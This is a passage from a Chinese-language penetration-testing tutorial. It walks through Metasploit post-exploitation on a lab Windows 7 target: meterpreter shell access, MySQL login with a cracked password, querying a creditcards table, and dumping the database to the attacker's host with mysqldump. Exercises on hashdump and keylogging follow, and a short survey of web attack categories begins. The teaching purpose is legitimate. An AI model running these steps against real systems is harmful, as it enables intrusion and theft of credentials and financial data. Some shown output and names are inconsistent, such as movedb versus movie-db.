

arise.com/post/2018/11/26/metasploit-basics-part-21-post-exploitation-with-mimikatz.

## 扫描内部网络

通常，我们攻击的最终目标与我们已攻陷的系统是不同的。最终目标可能是网络上的另一台系统，例如同一网络上的数据库服务器或域控制器。既然我们已经在网络内部拥有了立足点，我们就可能利用该立足点攻陷整个网络！

攻陷网络中其他系统的第一步是扫描，以查看网络上有哪些可用资源。最终，我们希望从被攻陷的系统跳转到同一网络上的其他计算机和设备。

为了弄清楚网络上还有哪些系统，meterpreter 提供了一条后渗透命令：arp scanner。地址解析协议（ARP）用于在局域网（LAN）中将 MAC 地址映射为 IP 地址。

该工具模拟了这一过程，迫使网络中的系统暴露其 IP 地址和 MAC 地址。

现在我们就知道了网络中的每个系统！

```
meterpreter > shell
Process 340 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>mysql -u root -p
Enter password: ****
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1
Server version: 5.1.70-community MySQL Community Server (GPL)

Copyright (c) 2000, 2013, Oracle and/or its affiliates.  All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help.  Type '\c' to clear the current input statement.
```

### MySQL 的后渗透

在第 8 章中，我们在 Windows 7 目标上的 MySQL 数据库上使用了暴力破解密码工具。我们轻松地恢复了密码，因为管理员使用的是弱密码。现在我们拿到了密码，在后渗透阶段可以做什么？

**连接到数据库**
第一步是使用我们在第 8 章破解的密码连接到 Windows 7 系统上的 MySQL 数据库。

**进入 Shell**
首先，我们需要从 meterpreter 切换到 Windows shell。

`meterpreter>shell`

然后我们需要连接 MySQL。

`C:\Windows\system32> mysql -u root -p`

系统会提示你输入密码。输入第 8 章中的密码并按 ENTER 键。

此时我们将得到一个 mysql 提示符。

`mysql>`

接下来，我们请求 MySQL 显示所有数据库。

`mysql > show databases;`

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| movedb             |
| mysql              |
| test               |
+--------------------+
4 rows in set (0.19 sec)
mysql> use movedb;
Database changed
mysql>
```

你可以看到，有一个名为“movedb”的数据库看起来很感兴趣。这正是我们在第 4 章使用脚本在 Windows 7 系统上创建的那个数据库。

接下来，我们需要指示 MySQL 数据库系统使用那个数据库（movedb）。

`mysql > use movedb`

然后我们可以显示该数据库内的表。

`mysql > show tables;`

要查看表 creditcards 中的所有数据，我们可以输入：
`mysql > SELECT * FROM creditcards;`

如果数据量太大，无法截图并复制到纸上，我们可以将整个数据库转储到我们的 Kali 系统中。首先，我们需要退出 mysql 并回到命令提示符。

`mysql > quit`

`C:\`

现在，从命令提示符，我们可以调用用于创建数据库备份的 mysqldump 命令，并将其输出重定向到我们的远程系统：
`mysqldump -u root -p -h 192.168.1.103 movie-db > backup.sql`

### 总结

在利用目标系统之后，攻击者通常希望在该系统上执行**某些**操作。这通常被称为后渗透。使用 Metasploit，我们可以借助 Metasploit 命令和后渗透模块获得众多选择，使我们能够：

1. 提取密码哈希
2. 拍摄或流式传输网络摄像头画面
3. 激活并录制麦克风音频
4. 扫描网络
5. 记录目标的所有按键操作（键盘记录）

针对 MySQL 数据库，由于管理员使用了弱密码，我们能够将数据库中的所有数据提取或转储到我们的远程系统。

### 练习

- 1. 在 Metasploit 中查找所有后渗透模块。
- 2. 在 Metasploit 中查找所有 Windows 后渗透模块。
- 3. 利用一台 Windows 7 系统并获取 meterpreter 提示符。
- 4. 使用 hashdump 命令捕获哈希值并下载到你的 Kali 系统。
- 5. 将 meterpreter 迁移到目标正在使用的进程中，并捕获其按键操作。
- 6. 使用你在第 8 章中找到的密码连接并登录 mysql 数据库，然后转储该数据库。

![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_422_0.png)

![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_422_1.png)

## 1.2 Web 黑客攻击

> *如果一项服务是免费的，那么你不是顾客，你是产品。*
>
> *Master OTW*

**互联网和万维网（www）在其短暂的生命历程中使许多美好的事物成为可能。列举这些美好事物的清单可以写满好几页，但也许最重要的意义在于电子商务和社交网络的发展。这两个应用以深刻的方式改变了我们的生活。然而，随着所有这些好处而来的，也有阴暗的一面。**

所有这些流量都容易遭受拦截和篡改。

在开始本章之前，请注意本章标题为“Web 黑客攻击”。与许多关于黑客和渗透测试的书籍不同，这里不是指“Web 应用黑客攻击”。原因是破解 Web 流量的**无数**方法中，并不全都是针对 Web 应用程序或 Web App 的攻击。

为了开始本章，让我们先战略性地思考 Web 黑客攻击。有许多攻击 Web 流量的策略，与其只关注其中一种，不如我们先看看各种可能性，然后专注于其中少数几种。书中关于黑客的一章甚至无法触及表面，因此，我们将专注于策略和一些例子。

如果你是 Web 技术的新手，或者需要复习基础知识，请查看我在 Hackers-Arise 上关于 Web 技术基础的文章，地址为 https://www.hackers-arise.com/single-post/2018/07/22/Web-App-Hacking-Web-Application-Technologies-Part-1.

### Web 黑客攻击的方法

虽然有成百上千种黑客攻击 Web 的方式，但它们可以归类为八种基本类型。

### 1. 攻击客户端控制

Web 黑客攻击中最受欢迎的领域之一是攻击客户端控制。

### 2. 攻击身份验证

身份验证黑客攻击可能包括绕过身份验证（例如捕获令牌并重放）、客户端附带请求、跨站点请求伪造（CSRF），以及当然的破解用户名和密码（参见下文关于从 WordPress 网站收集用户名并暴力破解密码的部分）。

### 3. 攻击会话管理

会话管理使应用程序能够跨多个请求唯一地识别用户。

当用户登录时，会话管理使用户能够与 Web 应用交互，而无需对每个请求重新进行身份验证。由于其关键作用，如果我们能破坏应用程序的会话管理，我们就可以绕过身份验证。这样，我们就不需要破解用户名和密码来获得访问权限。

### 4. 访问控制与授权的攻击

在这个领域，黑客会指认访问控制列表（ACL）并以允许黑客违反 ACL 的方式攻击它们。

### 5. 后端组件的攻击

后端组件的攻击包括使用 sqlmap 等工具进行 SQL 注入（参见下文关于 SQL 注入的部分），但也包括针对 XPATH 和 LDAP 的攻击和注入。

### 6. 攻击用户

攻击用户是我最喜欢的 Web 黑客技术之一。
从技术上讲，它不是 Web 黑客攻击，因为我们攻击的是最终用户，而不是 Web 应用，通过诱导他们访问我们的网站并在其浏览器甚至系统中加载恶意软件。这些技术包括跨站点脚本攻击（XSS）、跨站点请求伪造、攻击浏览器以及违反同源策略。

### 7. 攻击 Web 应用管理

在许多情况下，Web 应用程序具有管理控制台或其他管理界面。如果我们能访问该控制台或界面，我们理论上可以更改网站的一切，包括篡改它。

### 8. 攻击 Web 服务器

在某些情况下，我们可以黑客攻击 Web 应用程序的底层服务器，例如 Microsoft 的 Internet Information Server (IIS)、Apache Project 的 Apache 服务器或 nginx。如果我们获得了对底层服务器的控制和访问权限，这可能会给我们提供一个进入 Web 应用程序的入口点。

### 1. 注入

**根据开放 Web 应用安全项目（OWASP）对网站漏洞的定义，以下是 2019 年最重要的十大 Web 应用漏洞：**

